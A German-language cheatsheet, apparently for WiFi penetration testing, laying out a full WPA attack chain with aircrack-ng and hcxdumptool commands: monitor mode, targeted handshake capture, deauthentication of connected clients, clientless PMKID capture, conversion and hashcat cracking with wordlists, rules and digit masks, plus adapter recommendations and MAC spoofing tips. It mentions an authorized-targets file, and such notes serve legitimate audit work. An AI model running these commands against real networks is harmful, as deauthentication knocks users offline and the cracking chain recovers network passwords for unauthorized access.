# WiFi Audit Cheatsheet

## Workflow

1. Adapter mit Monitor-Mode + Packet-Injection (z.B. ALFA AWUS036ACM, Panda PAU09)
2. `wifi-monitor-start.sh wlan0` -> `wlan0mon`
3. `wifi-scan.sh wlan0mon` -> Liste sichtbarer Netze
4. Target-BSSID/SSID in `authorized-targets/targets.yaml` eintragen
5. `handshake-capture.sh wlan0mon <BSSID> <CH> [SSID]`
6. `pcap-to-hashcat.sh capture.cap` -> .hc22000
7. `crack-wpa.sh out.hc22000` -> hashcat -m 22000

## Manual Commands

```bash
# Monitor-Mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan ohne airodump-Lock (aktive Probes)
sudo airodump-ng wlan0mon

# Targeted Scan (lock auf BSSID + Channel)
sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w cap wlan0mon

# Deauth (1 = endlos, 3 = drei Pakete)
sudo aireplay-ng --deauth 3 -a AA:BB:CC:11:22:33 wlan0mon

# Convert pcap -> hashcat
hcxpcapngtool -o out.hc22000 capture.cap

# PMKID (clientless, falls Router PMKID nutzt)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
```

## Hashcat

```bash
hashcat -m 22000 out.hc22000 rockyou.txt
hashcat -m 22000 out.hc22000 -a 3 ?d?d?d?d?d?d?d?d   # 8 digits
hashcat -m 22000 out.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

## Karten-Empfehlungen

| Chipset       | Modell            | Monitor | Injection | 5GHz |
|---------------|-------------------|---------|-----------|------|
| RTL8812AU     | ALFA AWUS036ACH   | ja      | ja        | ja   |
| MT7612U       | ALFA AWUS036ACM   | ja      | ja        | ja   |
| RT3070        | Panda PAU09       | ja      | ja        | nein |
| AR9271        | TP-Link TL-WN722N v1 | ja   | ja        | nein |

## Hinweise

- Internal-WiFi der meisten Laptops kann nur sniffen, kein Inject
- 5GHz nur mit MT7612U/RTL8812AU brauchbar
- Macchanger nach Monitor-Start, vor airodump-Start
